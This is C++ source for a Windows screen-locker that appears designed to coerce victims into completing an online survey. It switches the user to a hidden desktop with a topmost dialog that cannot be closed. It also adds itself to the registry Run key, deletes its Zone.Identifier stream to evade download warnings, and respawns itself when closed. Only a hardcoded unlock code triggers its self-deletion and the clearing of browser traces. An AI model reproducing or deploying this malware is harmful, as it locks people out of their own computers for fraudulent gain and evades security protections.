#include <Windows.h>
#include <ShlObj.h>

#include "resource.h"

#include "API.hpp"


#define SURVEY_URL	L"http://192.168.2.8/index.php"

#define UNLOCK_CODE	L"123" 

#include "LockPersist.hpp"


HWND g_hToolbar = NULL;
wchar_t wUnlockCodeBuffer[MAX_PATH];
BOOL CanUninstall = 0;
HANDLE hIE = NULL;

void TriggerIEWindow()
{
	wchar_t cmd[MAX_PATH];
	wsprintfW(cmd, L" -k %s", SURVEY_URL);
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));

	si.lpDesktop = L"MSCPAS";
	TCHAR szPath[MAX_PATH];

	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, 0, szPath)))
	{
		wsprintfW(szPath, L"%s%s", szPath, L"\\Internet Explorer\\iexplore.exe");
		CreateProcessW(szPath, cmd, NULL, NULL, 1, NULL, NULL, NULL, &si, &pi);
		hIE = pi.hProcess;
	}
	else {
		// Fuck it!
	}	
}


BOOL DialogProc(HWND hDlg, UINT iMessage, WPARAM wParam, LPARAM lParam) {
	switch (iMessage) {
	case WM_COMMAND:
		switch (LOWORD(wParam)) {
		case IDC_BUTTON1:

			CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&TriggerIEWindow, NULL, NULL, NULL);

			return TRUE;
			break;
		case IDC_BUTTON2:
			GetWindowTextW(GetDlgItem(hDlg, IDC_EDIT1), wUnlockCodeBuffer, 260);
			if (!lstrcmpW(wUnlockCodeBuffer, UNLOCK_CODE))
			{
				CanUninstall = 1;
				PostQuitMessage(0);
			}
			else {
				MessageBoxW(0, L"Sorry, that code is incorrect.", 0, 0);
			}
			return TRUE;
			break;
			
		case WM_DESTROY:
		case WM_CLOSE:
			MessageBoxW(0, L"You must complete the survey first!", 0, 0);
			break;
		}

		break;
	}
	return FALSE;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{


	LockPersist<BOOL> LP;
	LP.Mutex(L"Local\\{d75b59a2-3439-46ec-9217-18bd62de1133}");
	HMODULE hModule = GetModuleHandleW(NULL);
	WCHAR wCurrentModPath[MAX_PATH], wCurrentModZoneID[MAX_PATH];
	GetModuleFileNameW(hModule, wCurrentModPath, MAX_PATH);
	wsprintfW(wCurrentModZoneID, L"%s:Zone.Identifier", wCurrentModPath);
	API<void>("kernel32.dll", "DeleteFileW")(1, wCurrentModZoneID); 
	
	LP.AddRemoveStartup(INSTALL, HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"CPA"); 
	
	MSG messages;
	HDESK   hOriginalThread;
	HDESK   hOriginalInput;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));


	HANDLE hCurProc = NULL;
	hCurProc = API<HANDLE>("kernel32.dll", "GetCurrentProcess")(0);


	LP.HandlePersistence(hCurProc);

	hOriginalThread = GetThreadDesktop(GetCurrentThreadId());	
	hOriginalInput = OpenInputDesktop(0, FALSE, DESKTOP_SWITCHDESKTOP);
	
	HDESK hNewDesktop = NULL;
	SECURITY_ATTRIBUTES hDeskSec = { 0 };
	hDeskSec.bInheritHandle = 1;
	
	hNewDesktop = CreateDesktop(L"MSCPAS", NULL, NULL, 0, GENERIC_ALL, &hDeskSec); 
	SetThreadDesktop(hNewDesktop);
	SwitchDesktop(hNewDesktop);
	

	g_hToolbar = CreateDialogW(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_DIALOG1), NULL, (DLGPROC)DialogProc);
	ShowWindow(g_hToolbar, SW_SHOW);
	SetWindowPos(g_hToolbar, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
	while (GetMessage(&messages, NULL, 0, 0))
	{
		TranslateMessage(&messages);
		DispatchMessage(&messages);
	}
	
	SwitchDesktop(hOriginalInput);
	SetThreadDesktop(hOriginalThread);
	
	if (CanUninstall)
	{
		LP.AddRemoveStartup(UNINSTALL, HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"CPA");  // If we're uninstalling.
		wchar_t wUninstallCommand[] = L"cmd /c \"ping -n 10 127.0.0.1 & del";
		
		wsprintfW(wUninstallCommand, L"%s \"%s\" & RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255", wUninstallCommand, wCurrentModPath);
		CreateProcessW(NULL, wUninstallCommand, NULL, NULL, NULL, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	}
	else
	{
		// FUCK
		CreateProcessW(wCurrentModPath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, &si, &pi);
	}
	if (hIE != NULL)
		TerminateProcess(hIE, 0);
	ExitProcess(0);
}